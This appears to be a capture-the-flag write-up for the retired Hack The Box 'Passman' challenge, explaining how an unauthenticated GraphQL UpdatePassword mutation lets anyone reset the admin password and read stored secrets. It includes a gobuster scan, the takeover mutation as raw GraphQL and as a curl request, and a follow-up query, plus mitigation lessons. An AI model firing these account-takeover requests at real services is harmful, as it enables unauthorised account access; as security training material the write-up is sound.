---
challenge: Passman
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, graphql, idor, broken-access-control, source-review]
---

# Passman — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Analysis notes; the flag is not published.

## Brief

A password manager with a **GraphQL** API. The application's **source code** is provided (or published), so this is a review challenge, not brute force.

## Recon

```bash
gobuster dir -u http://<IP>:<PORT>/ -w /usr/share/wordlists/dirb/common.txt
```

- `/` serves the frontend; `/graphql` exposes the schema.
- With the code in hand, the schema is read straight from the resolvers and `schema.graphql`.

## The flaw: `UpdatePassword` without authorisation

The mutations file holds an operation that changes a user's password from a username and a new password, **without checking the caller** and without asking for the current password:

```graphql
mutation {
  UpdatePassword(username: "admin", password: "<NEW_PASS>") {
    message
  }
}
```

This is not a read IDOR: it is a **write mutation with no access control**. It takes over `admin`.

```bash
curl -s http://<IP>:<PORT>/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"mutation { UpdatePassword(username: \"admin\", password: \"<NEW_PASS>\") { message } }"}'
```

## Log in and read the flag

Log in as `admin` with the new password; the flag is **inside the manager**, attached to the administrator's account.

> Mind the decoy: `entrypoint.sh` seeds a fake flag into the database so the challenge "has" data. The valid one appears only after authenticating as `admin`.

```bash
curl -s http://<IP>:<PORT>/graphql -H 'Content-Type: application/json' \
  -H "Authorization: Bearer <token>" \
  -d '{"query":"{ getPhrase(username: \"admin\") { phrase } }"}'
```

## Findings

- The vector is **GraphQL without authorisation on a mutation**, not a classic read IDOR.
- The password changes without the previous one and without verifying the requester's identity.
- The container-seeded flag is noise: only the administrator's counts.

## Lessons

- In GraphQL, review every mutation, not just the queries.
- Credential changes must require the current password and a valid session.
- A seeded flag is a common trap; the real target sits behind authentication.
- Mitigation: per-resolver authorisation, mandatory `currentPassword`, and rate limiting on `/graphql`.
